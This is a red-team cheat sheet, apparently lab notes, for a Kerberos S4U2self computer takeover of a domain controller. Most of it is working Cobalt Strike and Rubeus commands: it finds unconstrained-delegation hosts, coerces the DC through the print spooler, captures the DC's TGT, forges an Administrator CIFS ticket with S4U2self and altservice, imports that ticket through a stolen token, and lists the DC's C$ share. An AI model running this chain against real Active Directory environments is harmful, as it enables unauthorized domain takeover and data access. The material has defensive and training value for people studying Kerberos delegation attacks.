---
title: "Kerberos S4U2self Computer Takeover"
description: "Use a controlled computer TGT to request a ticket to that same computer as another user, with the lab capture flow, altservice and session verification."
category: "Kerberos"
tools: ["Cobalt Strike", "Rubeus", "Kerbeus BOF", "SharpSpoolTrigger"]
updated: 2026-11-15
tags: ["kerberos", "s4u2self", "delegation", "computer-takeover"]
draft: false
---

## 1. Why the attack works

A computer account's TGT authenticates the **computer**, not its local Administrator. Importing that TGT does not automatically give a privileged user's access to `C$`.

With control of a computer account's usable TGT and session key, the lab uses S4U2self to obtain a service ticket **to that same computer** as another user, then substitutes the service name to CIFS. The target service receives the impersonated user's identity rather than the computer's identity.

This is **not S4U2proxy**: `/self` stops after S4U2self. It does not require a classic delegation entry granting access to a separate back end. A non-forwardable ticket can still be usable at the service itself; forwardability is not a universal requirement for presenting a final service ticket.

| Material | Purpose |
|---|---|
| Target computer TGT and session key | Authenticate S4U2self as the target's account |
| Eligible impersonated identity | Determines the permissions evaluated by the target service |
| `/altservice:cifs/lon-dc-1` | Select the service on the computer whose TGT is controlled |

## 2. Lab prerequisite: capture the target computer TGT

If the target computer TGT is already available, skip to the next section. The notes obtain it by monitoring an already-controlled unconstrained-delegation host, `lon-ws-1`, while triggering authentication from `lon-dc-1`.

```shell
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
# Run monitoring from the elevated Beacon on LON-WS-1.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
# Required result: a usable TGT for LON-DC-1$@CONTOSO.COM.
```

The trigger depends on the relevant remote service, reachability, authentication protocol, and delegation policy. An authentication callback does not guarantee a forwarded Kerberos TGT. If the Spooler is unavailable or policy blocks forwarding, this acquisition path fails.

Record the monitor JID with `jobs` and stop that specific job once the required ticket is obtained.

## 3. Request a ticket to the computer itself

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:<DC_COMPUTER_TGT_BASE64> /nowrap
# Expected final ticket: Administrator -> cifs/lon-dc-1
```

BOF alternative from the notes, for a Kerbeus build supporting these arguments:

```shell
beacon> krb_s4u /ticket:<DC_COMPUTER_TGT_BASE64> /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
```

Check that the ticket supplied is for **LON-DC-1$**, not `LON-WS-1$`. A WS-1 TGT does not make this same-computer technique work against DC-1.

## Use the resulting service ticket

Use the **final service ticket**, not the front-end TGT or intermediate S4U2self ticket. Create a separate network-only process, record its returned PID, and select that token in Beacon. `FakePass` is a placeholder for the network-only session; the imported ticket supplies Kerberos authentication.

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
# Record ProcessID and verify that ticket import succeeded.
beacon> steal_token <PID>
beacon> run klist
# Client: Administrator @ CONTOSO.COM
# Server: cifs/lon-dc-1 @ CONTOSO.COM
beacon> ls \\lon-dc-1\c$
```

A ticket proves an identity to a service; it does not grant permissions absent from that identity. Use the hostname matching the ticket, not an IP address.

## Session cleanup

Purge only the disposable session while its token is selected, then revert and terminate the process created for this test. Do not purge an unrelated user's cache.

```shell
beacon> kerberos_ticket_purge
beacon> rev2self
beacon> kill <PID>
```

## Stop the capture job

```shell
beacon> jobs
beacon> jobkill <MONITOR_JID>
```

## Troubleshooting

| Symptom | Check |
|---|---|
| No captured target TGT | Callback conditions, Kerberos versus NTLM, delegation policy and selected host |
| Client remains `LON-DC-1$` | The computer TGT was imported instead of the final S4U2self service ticket |
| Wrong target service | `/self`, `/altservice`, target computer account and hostname |
| Access denied as Administrator | Actual account identity, account restrictions and service authorization |

## Related references

- [Unconstrained delegation](/cheatsheets/kerberos-unconstrained-delegation-cheatsheet/)
- [Service name substitution](/cheatsheets/kerberos-service-name-substitution-cheatsheet/)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF)
